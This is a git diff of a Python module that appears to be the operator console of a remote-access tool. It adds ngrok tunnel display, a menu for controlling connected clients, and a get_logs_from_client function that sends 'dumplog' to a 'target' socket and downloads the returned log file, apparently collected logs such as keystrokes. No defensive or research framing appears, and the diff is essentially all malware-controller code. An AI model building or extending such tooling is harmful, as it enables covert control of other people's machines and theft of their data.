@@ -1,12 +1,19 @@
 import os, sys
-from config.local import LOCAL_HOST
+import socket
+
+from config.local import HOST
+from services.file_transfer import *
+
+WIN = sys.platform == "win32"
+CURRENT_DIR = os.getcwd()
+TEMP_DIR = os.environ["TEMP"] if WIN else "/tmp"
 
 
 def clear():
-    OS = sys.platform == "win32"
-    os.system("cls") if OS else os.system("clear")
+    os.system("cls") if WIN else os.system("clear")
 
-def help():
+
+def help(ngip, ngport):
     clear()
     print('_'*65)
     print('exit                        -    returns server interface')
@@ -26,6 +33,14 @@ def help():
     print('restart                     -    restarts client connection')
     print('shutdown                    -    shutdown client connection')
     print(65*'_')
-    print(f'Local Address: {LOCAL_HOST[0]}:{LOCAL_HOST[1]}')
-    print(f'Ngrok tunnel: {NGROK_IP}: {NGROK_PORT}')
+    print(f'Local Address: {HOST[0]}:{HOST[1]}')
+    print(f'Ngrok tunnel: {ngip}: {ngport}')
     print('_'*65)
+
+def get_logs_from_client(target: socket, command: str) -> None:
+    target.send("dumplog".encode(UTF))
+    log_path = target.recv(1024).decode(UTF)
+    if log_path:
+        command = command.replace("dumplog", "").strip()
+        command = f"download {log_path}"
+        file_download(command, target)
